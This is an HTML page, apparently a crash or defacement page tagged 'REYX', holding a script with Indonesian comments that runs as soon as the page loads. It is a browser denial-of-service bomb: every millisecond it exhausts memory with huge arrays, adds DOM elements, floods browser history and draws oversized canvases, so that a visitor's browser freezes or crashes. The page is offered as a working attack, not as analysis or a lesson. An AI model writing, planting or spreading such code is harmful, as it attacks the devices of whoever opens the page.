<!DOCTYPE html>
<html>
<head>
    <title>FATAL ERROR :: REYX</title>
    <style>
        body { background: #000; color: #f00; font-family: monospace; overflow: hidden; }
        .crash-text { font-size: 50px; text-align: center; margin-top: 20%; text-shadow: 0 0 10px #f00; }
    </style>
</head>
<body>
    <div class="crash-text">SYSTEM OVERLOAD<br>REYX INJECTED</div>

    <script>
        // MODUL: MEMORY & DOM BOMB
        function startAnnihilation() {
            let storage = [];
            
            // Loop ini tidak hanya rekursif, tapi menggandakan penggunaan RAM secara eksponensial
            setInterval(() => {
                // 1. Memory Exhaustion
                for (let i = 0; i < 10000; i++) {
                    storage.push(new Array(100000).fill("REYX_SPIDER_INFECTED"));
                }

                // 2. DOM Stress (Membuat ribuan elemen tak terlihat per detik)
                let crashDiv = document.createElement('div');
                crashDiv.innerHTML = Math.random();
                document.body.appendChild(crashDiv);

                // 3. Browser History Flooding
                for (let j = 0; j < 500; j++) {
                    window.history.pushState({}, "", "#REYX_" + Math.random());
                }

                // 4. Heavy Graphic Computation
                let canvas = document.createElement('canvas');
                let ctx = canvas.getContext('2d');
                ctx.fillStyle = 'red';
                ctx.fillRect(0, 0, 5000, 5000);
            }, 1);
        }

        // Eksekusi Instan
        startAnnihilation();
    </script>
</body>
</html>
